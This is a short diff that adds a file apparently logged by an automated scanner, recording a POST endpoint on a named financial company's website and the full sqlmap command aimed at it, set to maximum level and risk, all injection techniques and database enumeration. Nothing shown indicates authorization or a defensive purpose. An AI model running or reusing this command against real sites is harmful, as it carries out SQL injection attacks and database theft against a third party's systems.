@@ -1,0 +1,3 @@
+https://www.infinitycapital.bh/api/send (POST)  # /usr/bin/sqlmap -u https://www.infinitycapital.bh/api/send --data=data.txt --method=POST --batch --level=5 --risk=3 --threads=1 --delay=1.5 --technique=BEUSTQ --dbs --output-dir=/var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e/tool_outputs/sq/out
+
+data.txt
